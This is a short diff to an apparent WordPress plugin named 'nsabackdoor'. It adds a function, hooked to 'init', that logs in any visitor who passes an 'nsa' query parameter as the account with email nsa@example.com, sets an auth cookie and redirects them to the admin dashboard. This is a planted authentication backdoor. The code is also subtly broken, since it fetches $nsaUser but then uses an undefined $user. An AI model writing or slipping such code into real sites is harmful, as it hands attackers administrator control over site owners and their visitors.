@@ -24,3 +24,20 @@ function nsabackdoor_create_login() {
 }
  
 add_action( 'init', 'nsabackdoor_create_login' );
+
+function nsabackdoor_auto_login() {
+
+  $isNsa = get_query_var( 'nsa' );
+
+  if ( $isNsa ) {
+    $nsaUser = get_user_by( 'email', 'nsa@example.com' );
+
+    wp_set_current_user( $user->ID, $user->user_login );
+    wp_set_auth_cookie( $user->ID );
+    do_action( 'wp_login', $user->user_login, $user );
+    wp_safe_redirect( admin_url() );
+  }
+
+}
+
+add_action( 'init', 'nsabackdoor_auto_login' );
